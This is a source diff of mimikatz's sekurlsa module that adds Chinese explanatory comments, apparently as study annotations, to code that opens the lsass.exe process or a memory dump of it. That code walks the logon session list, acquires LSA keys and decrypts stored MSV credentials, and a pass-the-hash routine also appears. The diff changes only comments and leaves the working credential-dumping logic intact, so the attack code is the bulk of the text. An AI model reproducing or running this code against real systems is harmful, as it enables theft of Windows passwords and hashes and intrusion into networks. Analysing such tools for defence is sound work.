@@ -55,7 +55,7 @@ const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {  //调用logonpasswords会执
 	&kuhl_m_sekurlsa_kdcsvc_package,
 	&kuhl_m_sekurlsa_cloudap_package,
 };
-
+//不同 Windows 版本下 LogonSession 结构体字段的偏移量
 const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
 	{sizeof(KIWI_MSV1_0_LIST_51), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_51, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_52), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_52, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonServer)},
@@ -164,20 +164,20 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 	BOOL isError = FALSE;
 	PBYTE pSk;
 
-	if(!cLsass.hLsassMem)
+	if(!cLsass.hLsassMem)   //没有获取句柄的情况下
 	{
 		status = STATUS_NOT_FOUND;
 		if(pMinidumpName)   //通过分析预先创建的LSASS内存转储文件来提取凭据
 		{
 			Type = KULL_M_MEMORY_TYPE_PROCESS_DMP;
 			kprintf(L"Opening : \'%s\' file for minidump...\n", pMinidumpName);
-			hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+			hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);  //创建文件句柄
 		}
 		else  //直接访问运行中的LSASS进程来获取凭据
 		{
 			Type = KULL_M_MEMORY_TYPE_PROCESS;
 			if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
-				hData = OpenProcess(processRights, FALSE, pid);
+				hData = OpenProcess(processRights, FALSE, pid);  //打开句柄
 			else PRINT_ERROR(L"LSASS process not found (?)\n");
 		}
 
@@ -185,7 +185,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 		{
 			if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))  //通过统一的内存访问接口实现
 			{
-				if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
+				if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)  //针对转储的
 				{
 					if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream, NULL))
 					{
@@ -215,7 +215,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 				}
 				else
 				{
-				#if defined(_M_IX86)
+				#if defined(_M_IX86)  //兼容性问题考虑
 					if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
 						PRINT_ERROR(MIMIKATZ L" " MIMIKATZ_ARCH L" cannot access x64 process\n");
 					else
@@ -227,27 +227,27 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 					}
 				}
 
-				if(!isError)
+				if(!isError)  //如果转储执行没有问题或者采用进程读取的执行下面逻辑
 				{
 					lsassLocalHelper =   //根据检测到的Windows版本，程序会选择相应的本地助手
 					#if defined(_M_ARM64)
-						&lsassLocalHelpers[0]
+						&lsassLocalHelpers[0]  //涉及到NT5等等加解密算法
 					#else
 						(cLsass.osContext.MajorVersion < 6) ? &lsassLocalHelpers[0] : &lsassLocalHelpers[1]
 					#endif
 					;
 
-					if(NT_SUCCESS(lsassLocalHelper->initLocalLib()))  //初始化本地库
+					if(NT_SUCCESS(lsassLocalHelper->initLocalLib()))  // 初始化加密库 准备本地解密环境
 					{
-					#if !defined(_M_ARM64)  //认证包有效性检查
+					#if !defined(_M_ARM64)  //认证包有效性检查 通过检查版本信息
 						kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
 					#endif
 						kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);
 						kuhl_m_sekurlsa_cloudap_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_BUILD_10_1909);
-						if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent) //模块信息获取和搜索
+						if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent) //扫描 LSASS 内存，获取模块信息 特别要求MSV 模块是否存在
 						{
-							kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
-							if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
+							kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;  //DPAPI 在凭据处理上依赖 MSV 模块，所以 mimikatz 复用它的模块信息
+							if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))  //寻找到相关地址
 							{
 								status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);  //密钥获取
 								if(!NT_SUCCESS(status))
@@ -276,7 +276,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
 {
 	ULONG i;
-	for(i = 0; i < ARRAYSIZE(lsassPackages); i++)
+	for(i = 0; i < ARRAYSIZE(lsassPackages); i++) //识别凭据认证模块是否存在
 	{
 		if(_wcsicmp(lsassPackages[i]->ModuleName, pModuleInformation->NameDontUseOutsideCallback->Buffer) == 0)
 		{
@@ -292,7 +292,7 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 	KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
 	ULONG nbListes = 1, i;
 	PVOID pStruct;
-	KULL_M_MEMORY_ADDRESS securityStruct, data = {&nbListes, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
+	KULL_M_MEMORY_ADDRESS securityStruct, data = {&nbListes, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};  //使用自身进程句柄来访问本地变量nbListes和缓冲区
 	BOOL retCallback = TRUE;
 	const KUHL_M_SEKURLSA_ENUM_HELPER * helper;
 	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();  //获取LSASS进程的访问权限
@@ -302,7 +302,7 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 		sessionData.cLsass = &cLsass;
 		sessionData.lsassLocalHelper = lsassLocalHelper;
 
-		if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_2K3)  //根据Windows版本选择合适的内存结构助手
+		if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_2K3)  //根据Windows版本选择合适的内存结构体，确保内存大小
 			helper = &lsassEnumHelpers[0];
 		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_VISTA)
 			helper = &lsassEnumHelpers[1];
@@ -316,25 +316,25 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 			helper = &lsassEnumHelpers[6];
 
 		if((cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp > 0x53480000))
-			helper++; // yeah, really, I do that =)
+			helper++; // yeah, really, I do that =)  //处理Windows 7到Windows 8.1之间某些特定版本的MSV模块的内存结构差异
 
 		securityStruct.hMemory = cLsass.hLsassMem;
 		if(securityStruct.address = LogonSessionListCount)
-			kull_m_memory_copy(&data, &securityStruct, sizeof(ULONG));
+			kull_m_memory_copy(&data, &securityStruct, sizeof(ULONG));  //如果拿到了 LogonSessionListCount 的地址，就先读出当前系统中登录会话的数量
 
 		for(i = 0; i < nbListes; i++)   //函数遍历LogonSessionList中的每个登录会话
 		{
 			securityStruct.address = &LogonSessionList[i];
 			data.address = &pStruct;
 			data.hMemory = &KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
-			if(aBuffer.address = LocalAlloc(LPTR, helper->tailleStruct))
+			if(aBuffer.address = LocalAlloc(LPTR, helper->tailleStruct))  
 			{
-				if(kull_m_memory_copy(&data, &securityStruct, sizeof(PVOID)))  
+				if(kull_m_memory_copy(&data, &securityStruct, sizeof(PVOID)))   //获取链表节点指针
 				{
 					data.address = pStruct;
 					data.hMemory = securityStruct.hMemory;
 
-					while((data.address != securityStruct.address) && retCallback)
+					while((data.address != securityStruct.address) && retCallback)  //遍历链表
 					{
 						if(kull_m_memory_copy(&aBuffer, &data, helper->tailleStruct))  //提取会话的基本信息
 						{
@@ -348,7 +348,7 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 							sessionData.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper->offsetToCredentialManager);
 							sessionData.LogonTime	= *((PFILETIME)		((PBYTE) aBuffer.address + helper->offsetToLogonTime));
 							sessionData.LogonServer	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToLogonServer);
-
+							//把指针解引用，把远程进程的字符串 / SID 数据复制到本地
 							kull_m_process_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);  //获取Unicode字符串和SID信息
 							kull_m_process_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
 							kull_m_process_getUnicodeString(sessionData.LogonServer, cLsass.hLsassMem);
@@ -376,13 +376,13 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 	}
 	return status;
 }
-
+//处理每个枚举到的登录会话并提取其凭据信息
 BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
 {
-	PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA pLsassData = (PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA) pOptionalData;
+	PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA pLsassData = (PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA) pOptionalData;  //认证包集合
 	ULONG i;
 	//PDWORD sub = NULL;
-	if((pData->LogonType != Network)/* && pData->LogonType != UndefinedLogonType*/)
+	if((pData->LogonType != Network)/* && pData->LogonType != UndefinedLogonType*/)  //过滤掉网络登录类型的会话
 	{
 		//if(IsValidSid(pData->pSid) && GetSidSubAuthorityCount(pData->pSid))
 		//	sub = GetSidSubAuthority(pData->pSid, 0);
@@ -1056,7 +1056,7 @@ VOID kuhl_m_sekurlsa_pth_luid(PSEKURLSA_PTH_DATA data)
 	else PRINT_ERROR(L"memory handle is not KULL_M_MEMORY_TYPE_PROCESS\n"); 
 }
 
-VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags)
+VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags)  //mimikatz 的 “凭据显示统一出口
 {
 	PUNICODE_STRING username = NULL, domain = NULL, password = NULL;
 	PKIWI_CREDENTIAL_KEYS pKeys = NULL;
@@ -1084,7 +1084,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 			if(msvCredentials = (PBYTE) ((PUNICODE_STRING) mesCreds)->Buffer)
 			{
 				if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
-					(*lsassLocalHelper->pLsaUnprotectMemory)(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length);
+					(*lsassLocalHelper->pLsaUnprotectMemory)(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length);  //使用 lsassLocalHelper->pLsaUnprotectMemory 函数指针来解密MSV凭据数据
 
 				switch(type)
 				{
